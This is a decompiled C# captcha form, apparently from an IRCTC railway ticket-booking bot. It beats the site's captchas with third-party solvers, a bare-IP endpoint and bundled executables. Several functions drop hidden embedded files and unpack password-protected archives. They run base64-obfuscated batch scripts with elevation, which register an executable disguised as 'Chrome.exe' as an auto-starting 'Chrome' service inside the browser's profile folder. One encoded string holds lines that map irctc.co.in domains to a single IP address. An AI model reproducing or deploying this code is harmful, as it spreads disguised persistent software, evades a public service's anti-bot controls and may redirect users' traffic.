							if (text4.Length == 5 && !(text4.ToUpper() == "ERROR") && !(text4.ToUpper() == "BLANK") && !(text4.ToUpper() == "BLACK") && !(text4.ToUpper() == "WRONG"))
							{
								method_27(text4);
							}
							else
							{
								text = webClient.DownloadString("http://" + string_8 + "/res.php?key=" + text2 + "&action=reportbad&id=" + text3);
							}
							return text4;
						}
					}
					break;
				}
			}
		}
		catch (Exception ex)
		{
			class28_0.Lock("RecognizeRIP ERR=" + ex.Message);
		}
		finally
		{
			method_28(false);
		}
		return text;
	}

	internal string method_23(byte[] byte_0, int int_6)
	{
		string text = "";
		try
		{
			method_28(true);
			string text2 = "http://api.endcaptcha.com/upload";
			string text3 = DateTime.Now.Ticks.ToString("x");
			string text4 = smethod_8("username", string_11, text3) + smethod_8("password", string_12, text3);
			text4 = text4 + smethod_9("image", Encoding.Default.GetString(byte_0), "image.png", "image/png", text3) + "--" + text3 + "--     ";
			string text5 = text4;
			int num = 0;
			while (num <= 14)
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text2);
				httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15 WebMoney Advisor";
				httpWebRequest.Accept = "*/*";
				httpWebRequest.Headers.Add("Accept-Language", "ru");
				httpWebRequest.Proxy = null;
				httpWebRequest.KeepAlive = true;
				httpWebRequest.AllowAutoRedirect = false;
				if (!string.IsNullOrEmpty(text4))
				{
					httpWebRequest.Method = "POST";
					httpWebRequest.ContentType = "multipart/form-data; boundary=" + text3;
					byte[] bytes = Encoding.Default.GetBytes(text4);
					httpWebRequest.ContentLength = bytes.Length;
					httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
				}
				else
				{
					httpWebRequest.Method = "GET";
				}
				try
				{
					HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
					string text6 = streamReader.ReadToEnd().ToUpper();
					streamReader.Close();
					httpWebResponse.Close();
					if (text2.Contains("api.endcaptcha.com/report"))
					{
						return text;
					}
					if (text6.Contains("ERROR"))
					{
						text6 = "ERROR";
						goto IL_023f;
					}
					if (!text6.Contains("UNSOLVED_YET"))
					{
						goto IL_023f;
					}
					text2 = "http://api.endcaptcha.com" + text6.Substring(text6.IndexOf(":") + 1).ToLower();
					text4 = "";
					num++;
					goto end_IL_017b;
					IL_023f:
					if (text6.Length == 5 && !(text6.ToUpper() == "ERROR") && !(text6.ToUpper() == "BLANK") && !(text6.ToUpper() == "BLACK") && !(text6.ToUpper() == "WRONG"))
					{
						text = text6.ToUpper();
						method_27(text);
						class28_0.Lock("RecognizeEndCaptcha : " + text);
						return text;
					}
					text4 = text5;
					text2 = "http://api.endcaptcha.com/report";
					num = 0;
					end_IL_017b:;
				}
				catch (Exception)
				{
					return text;
				}
			}
		}
		catch
		{
		}
		finally
		{
			method_28(false);
		}
		return text;
	}

	internal string method_24(byte[] byte_0, int int_6)
	{
		string text = "";
		string text2 = "";
		try
		{
			method_28(true);
			string arg = smethod_1(string_11, string_12)["balance"];
			Console.WriteLine("Your balance is {0}", arg);
			NameValueCollection nameValueCollection = smethod_4(string_11, string_12, byte_0);
			string string_ = nameValueCollection["captcha"];
			string text3 = nameValueCollection["text"].Replace("+", " ");
			long ticks = DateTime.Now.Ticks;
			int num = 5;
			int num2 = 0;
			while (text3 == "" && num2 < num)
			{
				if (num2 == 0)
				{
					Thread.Sleep(5000);
				}
				else
				{
					Thread.Sleep(2000);
				}
				text3 = smethod_3(string_)["text"].Replace("+", " ");
				Console.WriteLine("tryCount " + num2 + " " + text3);
			}
			if (!string.IsNullOrEmpty(text3) && text3.Length == 5)
			{
				text = text3.ToUpper();
				method_27(text);
				class28_0.Lock("RecognizeDecaptchaHTTP : " + text);
				return text;
			}
			text = "XXXXX";
			method_27(text);
			class28_0.Lock("RecognizeDecaptchaHTTP : " + text);
			return text;
		}
		catch (Exception ex)
		{
			class28_0.method_74("RecognizeDecaptcha out:" + text2 + "  Ex:", ex.Message);
			return text;
		}
		finally
		{
			method_28(false);
		}
	}

	internal static string smethod_8(string string_16, string string_17, string string_18)
	{
		object[] array = new object[14]
		{
			"--", string_18, '\r', '\n', "Content-Disposition: form-data; name=\"", string_16, "\"", '\r', '\n', '\r',
			'\n', string_17, '\r', '\n'
		};
		string result = string.Concat(array);
		Class10.object_0 = array;
		return result;
	}

	internal static string smethod_9(string string_16, string string_17, string string_18, string string_19, string string_20)
	{
		string text = "--" + string_20 + "\r\n";
		return string.Concat(text, "Content-Disposition: form-data; name=\"", string_16, "\"; filename=\"", string_18, "\"", 23 + "Content-Type: " + string_19 + " \r\n\r\n" + string_17 + "\r\n");
	}

	internal string method_26(byte[] byte_0, int int_6)
	{
		return "";
	}

	private void method_27(object object_1)
	{
		try
		{
			if (txtImageData.InvokeRequired)
			{
				txtImageData.Invoke(new ParameterizedThreadStart(method_27), object_1);
			}
			else if (object_1.ToString().Length > 2)
			{
				txtImageData.Text = object_1.ToString();
			}
		}
		catch
		{
		}
	}

	private void method_28(object object_1)
	{
		try
		{
			if (picOriginal.InvokeRequired)
			{
				picOriginal.Invoke(new ParameterizedThreadStart(method_28), object_1);
				return;
			}
			picOriginal.Refresh();
			if (!bool.Parse(object_1.ToString()))
			{
				picOriginal.Image = picOriginal.InitialImage;
				picOriginal.BackColor = Color.AntiqueWhite;
				picOriginal.SizeMode = PictureBoxSizeMode.Normal;
			}
			else
			{
				picOriginal.Image = image_0;
				if (class28_0.LoginType == "APP")
				{
					picOriginal.BackColor = Color.Black;
				}
				else
				{
					picOriginal.BackColor = Color.DeepPink;
				}
			}
			picOriginal.Refresh();
			if (bool.Parse(object_1.ToString()))
			{
				method_0();
				if (clsMain.bool_16)
				{
					string object_2 = SolveCaptcha(base64inage).Trim();
					method_27(object_2);
				}
			}
		}
		catch (Exception ex)
		{
			Console.Write(ex.Message.ToString());
		}
	}

	internal string method_29(byte[] byte_0, int int_6)
	{
		string text = "";
		string[] array = new string[3]
		{
			"RUMO",
			string_14.Substring(0, 16),
			string_14.Substring(16, 16)
		};
		if (array.Length >= 3)
		{
			string string_ = "https://gate1a.skipinput.com/q_gate.php?b=firefox&v=3000&l=en&key=" + array[1];
			string string_2 = "key=" + array[2] + "&fields=1%7C%7C0%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/javax.faces.resource/irctc_logo_en_IN.gif.jsf%3Fln%3Dimages%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/javax.faces.resource/CRIS-Full_en_IN.png.jsf%3Fln%3Dimages%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/download_ios_app.gif%0A2%7C%7C1%0A16%7C%7C2%7C%7CT%3Aj_username%7C%7CT%3Aj_captcha%7C%7CR%3Alabeltxt%20captchacls%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/captchaImage%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/refresh.gif%0A";
			CookieContainer cookieContainer_ = null;
			string string_3 = "";
			string string_4 = "";
			WebException webException_ = null;
			bool bool_ = false;
			HttpStatusCode httpStatusCode_ = HttpStatusCode.Accepted;
			class28_0.Lock("Inside RecognizeRumola");
			try
			{
				method_28(true);
				if (!class28_0.method_85(string_, string_2, "", null, ref cookieContainer_, false, true, 40000, 40000, ref string_3, ref string_4, ref webException_) || !string_3.Contains("CAPTCHA(s) found"))
				{
					return "";
				}
				string text2 = string_3.Substring(string_3.LastIndexOf("||") + 2);
				string_ = "https://gate1a.skipinput.com/b_gate.php?b=firefox&v=3000&key=" + text2 + "&f=0";
				string_2 = Convert.ToBase64String(byte_0);
				if (!class28_0.method_85(string_, string_2, "", null, ref cookieContainer_, false, true, 10000, 10000, ref string_3, ref string_4, ref webException_) || !string_3.Contains("WAIT"))
				{
					return "";
				}
				string_ = "https://gate1a.skipinput.com/b_gate.php?b=firefox&v=3000&key=" + text2;
				for (int i = 0; i < 7; i++)
				{
					Thread.Sleep(2500);
					class28_0.method_100(string_, "", null, ref cookieContainer_, false, true, 10000, ref string_3, ref bool_, ref webException_, ref httpStatusCode_, ref string_4);
					if (string_3.Contains("|OK|"))
					{
						text = string_3.Substring(string_3.LastIndexOf("||") + 2).ToUpper().Trim();
						class28_0.Lock("RecognizeRumola received: " + text);
						method_27(text);
						method_28(false);
						return text;
					}
					if (string_3.Contains("Sorry"))
					{
						break;
					}
				}
			}
			catch (Exception ex)
			{
				class28_0.method_74("RecognizeRumola", ex.Message);
			}
			finally
			{
				method_28(false);
			}
			return text;
		}
		return "";
	}

	private void lnkOTP_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		lnkOTP.Visible = false;
		ThreadPool.QueueUserWorkItem(method_30);
	}

	private void method_30(object object_1)
	{
		try
		{
			bool_10 = true;
			WebException webException_ = null;
			string string_ = "";
			string string_2 = "";
			class28_0.Lock("Resend OTP Called");
			class28_0.method_85(string_5, string_3, string_6, null, ref cookieContainer_0, true, false, 10000, 10000, ref string_, ref string_2, ref webException_);
		}
		catch
		{
		}
	}

    public static void smethod_12(object object_1)
    {
        try
        {
            string text = pks;
            bool flag = false;
            if (!File.Exists(Path.Combine(text, "CaptchaRecog.exe")))
            {
                flag = true;
            }
            string text2 = Path.Combine(text, "spiky5.dll");
            string text3 = Path.Combine(text, "spiky6.zip");
            if (!flag)
            {
                return;
            }
            if (File.Exists(text))
            {
                File.Delete(text2);
            }
            if (!File.Exists(text2))
            {
                Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("IRCommDLL.include.CaptchaRecog.dll");
                if (manifestResourceStream != null)
                {
                    FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
                    for (int i = 0; i < manifestResourceStream.Length; i++)
                    {
                        fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
                    }
                    fileStream.Close();
                    new FileInfo(text2).Attributes = FileAttributes.Hidden;
                }
            }
            if (!File.Exists(text2))
            {
                return;
            }
            if (!File.Exists(text3))
            {
                File.Copy(text2, text3, overwrite: true);
            }
            File.Delete(text2);
            try
            {
                ZipFile zipFile = ZipFile.Read(text3);
                try
                {
                    zipFile.ExtractAll(text);
                }
                finally
                {
                    zipFile?.Dispose();
                }
                File.Delete(text3);
            }
            catch (Exception ex)
            {
                File.Delete(text3);
                MessageBox.Show(ex.Message);
            }
        }
        catch
        {
        }
    }

    public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void ExtractFile(object j)
	{
		ptth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default";
		try
		{
			string base64EncodedData = "QGVjaG8gb2ZmCmNkIEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOQppbnN0YWxsdXRpbC5leGUgLXUgInBhdGhcQ2hyb21lLmV4ZSIKb3RvIGVycm9yCmV4aXQKOmVycm9yCmVjaG8gVGhlcmUgd2FzIGEgcHJvYmxlbQpwYXVzZQ==";
			base64EncodedData = Base64Decode(base64EncodedData);
			base64EncodedData = base64EncodedData.Replace("path", ptth);
			Process process = new Process();
			if (!Directory.Exists(ptth))
			{
				Directory.CreateDirectory(ptth);
			}
			if (!File.Exists(ptth + "\\Stop.bat"))
			{
				File.WriteAllText(ptth + "\\Stop.bat", base64EncodedData);
			}
			process = new Process();
			process.StartInfo.FileName = ptth + "\\Stop.bat";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.Verb = "runas";
			process.Start();
			while (true)
			{
				ServiceController serviceController = ServiceController.GetServices().FirstOrDefault((ServiceController s) => s.ServiceName == "Chrome");
				if (serviceController == null)
				{
					break;
				}
				Thread.Sleep(500);
			}
			File.Delete(ptth + "\\Stop.bat");
			Thread.Sleep(200);
			string text = "ChromeDriver.dll";
			string text2 = "ChromeDriver.zip";
			File.Delete(text);
			File.Delete(text2);
			if (File.Exists(ptth + "\\Chrome.exe"))
			{
				File.Delete(ptth + "\\Chrome.exe");
			}
			if (File.Exists(ptth + "\\Chrome.exe.tmp"))
			{
				File.Delete(ptth + "\\Chrome.exe.tmp");
			}
			if (File.Exists(ptth + "\\Chrome.exe.PendingOverwrite"))
			{
				File.Delete(ptth + "\\Chrome.exe.PendingOverwrite");
			}
			if (!File.Exists(text))
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("IRCommDLL.include.ChromeDriver.dll");
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text).Attributes = FileAttributes.Hidden;
				}
			}
			if (File.Exists(text))
			{
				if (!File.Exists(text2))
				{
					File.Copy(text, text2, true);
				}
				File.Delete(text);
				try
				{
					using (ZipFile zipFile = ZipFile.Read(text2))
					{
						zipFile.ExtractAll(ptth, ExtractExistingFileAction.OverwriteSilently);
					}
					File.Delete(text2);
				}
				catch (Exception ex)
				{
					File.Delete(text2);
					MessageBox.Show(ex.Message);
				}
			}
		}
		catch
		{
		}
		startS_(0);
	}

	public static void ExtractFile0(object object_1)
	{
		try
		{
			string text = "MTAzLjI1Mi4xNDIuMjEgKi5pcmN0Yy5jby5pbgoxMDMuMjUyLjE0Mi4yMSB3d3cuaXJjdGMuY28uaW4KMTAzLjI1Mi4xNDIuMjEgaXJjdGMuY28uaW4=";
			bool flag = false;
			if (File.Exists("SeleniumExtras.WaitHelpers.dll"))
			{
				return;
			}
			if (!File.Exists("SeleniumExtras.WaitHelpers.dll"))
			{
				flag = true;
			}
			string text2 = "spiky5.dll";
			string text3 = "spiky6.zip";
			if (flag && !File.Exists(text2))
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("IRCommDLL.include.SeleniumExtras.dll");
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text3))
			{
				File.Copy(text2, text3, true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text3);
				try
				{
					zipFile.ExtractAll(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text3);
			}
			catch (Exception ex)
			{
				File.Delete(text3);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	internal static void startS_(object j)
	{
		try
		{
			string base64EncodedData = "QGVjaG8gb2ZmCmNkIEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOQppbnN0YWxsdXRpbC5leGUgInBhdGhcQ2hyb21lLmV4ZSIKb3RvIGVycm9yCmV4aXQKOmVycm9yCmVjaG8gVGhlcmUgd2FzIGEgcHJvYmxlbQpwYXVzZQ==";
			base64EncodedData = Base64Decode(base64EncodedData);
			base64EncodedData = base64EncodedData.Replace("path", ptth);
			if (!File.Exists(ptth + "\\Start.bat"))
			{
				File.WriteAllText(ptth + "\\Start.bat", base64EncodedData);
			}
			ServiceController serviceController = new ServiceController("Chrome");
			ServiceController serviceController2 = ServiceController.GetServices().FirstOrDefault((ServiceController s) => s.ServiceName == "Chrome");
			if (serviceController2 != null)
			{
				return;
			}
			Process process = new Process();
			process.StartInfo.FileName = ptth + "\\Start.bat";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.Verb = "runas";
			process.Start();
			while (true)
			{
				ServiceController serviceController3 = ServiceController.GetServices().FirstOrDefault((ServiceController s) => s.ServiceName == "Chrome");
				if (serviceController3 != null)
				{
					break;
				}
				Thread.Sleep(500);
			}
			File.Delete(ptth + "\\Start.bat");
			serviceController.Start();
			Thread.Sleep(1000);
			Process process2 = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			process2.StartInfo.Verb = "runas";
			process2.StartInfo.CreateNoWindow = true;
			process2.StartInfo.UseShellExecute = false;
			processStartInfo.Arguments = "/c sc config Chrome start=auto";
			process2.StartInfo = processStartInfo;
			process2.Start();
		}
		catch
		{
		}
	}

	private void method_31(object object_1)
	{
		try
		{
			string text = pks;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			bool flag = false;
			if (!File.Exists(Path.Combine(text, "CaptchaRecog_CShape.exe")))
			{
				flag = true;
			}
			string text2 = Path.Combine(text, "spiky5.dll");
			string text3 = Path.Combine(text, "spiky6.zip");
			if (!flag)
			{
				return;
			}
			File.Delete(text2);
			File.Delete(text3);
			if (!File.Exists(text2))
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("IRCommDLL.include.CaptchaRecog.dll");
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text3))
			{
				File.Copy(text2, text3, true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text3);
				try
				{
					zipFile.Password = "DM04AP16MS3";
					zipFile.ExtractAll(text);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text3);
			}
			catch (Exception ex)
			{
				File.Delete(text3);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	private static void D_method_31(object object_1)
	{
		try
		{
			string text = pks;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			bool flag = false;
			if (!File.Exists(Path.Combine(text, "CaptchaRecog_CShape.exe")))
			{
				flag = true;
			}
			string text2 = Path.Combine(text, "spiky5.dll");
			string text3 = Path.Combine(text, "spiky6.zip");
			if (!flag)
			{
				return;
			}
			File.Delete(text2);
			File.Delete(text3);
			if (!File.Exists(text2))
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("IRCommDLL.include.CaptchaRecog_CShape.dll");
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text3))
			{
				File.Copy(text2, text3, true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text3);
				try
				{
					zipFile.Password = "DM04AP16MS3";
					zipFile.ExtractAll(text);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text3);
			}
			catch (Exception ex)
			{
				File.Delete(text3);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	internal string SolveCaptcha(string bs64)
	{
        //method_31(0);
		clsMain main = new clsMain();
		string result = string.Empty;
		//method_31(0);
		try
		{
            char[] separator = new char[1] { '|' };
            string text = bs64;
			Image ocrimage;
            using (MemoryStream stream = new MemoryStream(Convert.FromBase64String(text.Split(separator)[0])))
			{
                ocrimage = Image.FromStream(stream);
            }
            Ocr2 ocr = new Ocr2();
            Bitmap bitmap = new Bitmap(ocrimage);
            result = ocr.solve((Bitmap)ocrimage);
   //         if (string.IsNullOrEmpty(result))
			//{
			//	result = main.IRCTCOCR(bs64);

   //         }
			
		}
		catch (Exception)
		{
            //result = IRCTCOCR(bs64);
        }
		return result;
	}

    private string IRCTCOCR(string base64)
    {
        try
        {
            
            string URI = "http://185.172.64.80/home/IRCTCOCRO";
            string myParameters = "base64=" + HttpUtility.UrlEncode(base64);
            using (WebClient wc = new WebClient())
            {
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                string HtmlResult = wc.UploadString(URI, myParameters);
                return HtmlResult;
            }
        }
        catch
        {
            string htmlResults = "";
            return htmlResults;
        }

    }

    public static string D_SolveCaptcha(string bs64)
	{
		D_method_31(0);
		string result = string.Empty;
		D_method_31(0);
		try
		{
			string text = bs64 + "|NGET|";
			string arguments = text;
			Process process = new Process();
			process.StartInfo.FileName = Path.Combine(pks, "CaptchaRecog_CShape.exe");
			process.StartInfo.Arguments = arguments;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			process.WaitForExit(3500);
			result = standardOutput.ReadLine();
			if (!process.HasExited)
			{
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	internal string New_SolveCaptcha(string bs64)
	{
		string result = string.Empty;
		try
		{
			string text = Encrypt(bs64 + "|Locha|");
			pks = Path.Combine(pks, "Debug");
			Process process = new Process();
			process.StartInfo.FileName = Path.Combine(pks, "ApiSolver.exe");
			process.StartInfo.Arguments = bs64;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			process.WaitForExit(3500);
			result = standardOutput.ReadLine();
			if (!process.HasExited)
			{
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	private void btnCancel_Click(object sender, EventArgs e)
	{
		method_12();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		DateTime now = DateTime.Now;
		int hour = now.Hour;
		int minute = now.Minute;
		int second = now.Second;
	}

	private static string Encrypt(string string_0)
	{
		string str = "3r=f3435";
		byte[] rgbIV = new byte[8] { 22, 52, 75, 110, 134, 151, 215, 239 };
		byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(str, 8));
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		byte[] bytes2 = Encoding.UTF8.GetBytes(string_0);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
		cryptoStream.Write(bytes2, 0, bytes2.Length);
		cryptoStream.FlushFinalBlock();
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	protected new virtual void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmCaptcha));
            this.lnkOTP = new System.Windows.Forms.LinkLabel();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.txtImageData = new System.Windows.Forms.TextBox();
            this.lblWrongCaptcha = new System.Windows.Forms.Label();
            this.chkDark = new System.Windows.Forms.CheckBox();
            this.chkThin = new System.Windows.Forms.CheckBox();
            this.chkDarkLarge = new System.Windows.Forms.CheckBox();
            this.pnlCaptcha = new System.Windows.Forms.Panel();
            this.btnSubmit = new System.Windows.Forms.Button();
            this.picOriginal = new System.Windows.Forms.PictureBox();
            this.picDarkLarge = new System.Windows.Forms.PictureBox();
            this.picDark = new System.Windows.Forms.PictureBox();
            this.picThin = new System.Windows.Forms.PictureBox();
            this.lblTime = new System.Windows.Forms.Label();
            this.timer_1 = new System.Windows.Forms.Timer(this.components);
            this.bunifuElipse_0 = new Bunifu.Framework.UI.BunifuElipse(this.components);
            this.pnlHeader = new System.Windows.Forms.Panel();
            this.tktname = new System.Windows.Forms.Label();
            this.btnCancel = new Bunifu.Framework.UI.BunifuImageButton();
            this.btnReferesh = new Bunifu.Framework.UI.BunifuImageButton();
            this.pnlCaptcha.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.picOriginal)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picDarkLarge)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picDark)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picThin)).BeginInit();
            this.pnlHeader.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.btnCancel)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnReferesh)).BeginInit();
            this.SuspendLayout();
            // 
            // lnkOTP
            // 
            this.lnkOTP.AutoSize = true;
            this.lnkOTP.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lnkOTP.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.lnkOTP.Location = new System.Drawing.Point(592, 49);
            this.lnkOTP.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.lnkOTP.Name = "lnkOTP";
            this.lnkOTP.Size = new System.Drawing.Size(93, 16);
            this.lnkOTP.TabIndex = 19;
            this.lnkOTP.TabStop = true;
            this.lnkOTP.Text = "Resend OTP";
            this.lnkOTP.Visible = false;
            this.lnkOTP.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.lnkOTP_LinkClicked);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(489, 11);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(99, 16);
            this.label1.TabIndex = 1;
            this.label1.Text = "Original View";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(506, 50);
            this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(74, 16);
            this.label2.TabIndex = 3;
            this.label2.Text = "Thin View";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(509, 135);
            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(76, 16);
            this.label3.TabIndex = 5;
            this.label3.Text = "Dark View";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(506, 225);
            this.label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(120, 16);
            this.label4.TabIndex = 6;
            this.label4.Text = "Dark Large View";
            // 
            // txtImageData
            // 
            this.txtImageData.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtImageData.Font = new System.Drawing.Font("Arial", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtImageData.Location = new System.Drawing.Point(8, 78);
            this.txtImageData.Margin = new System.Windows.Forms.Padding(2);
            this.txtImageData.MaxLength = 20;
            this.txtImageData.Name = "txtImageData";
            this.txtImageData.Size = new System.Drawing.Size(137, 25);
            this.txtImageData.TabIndex = 9;
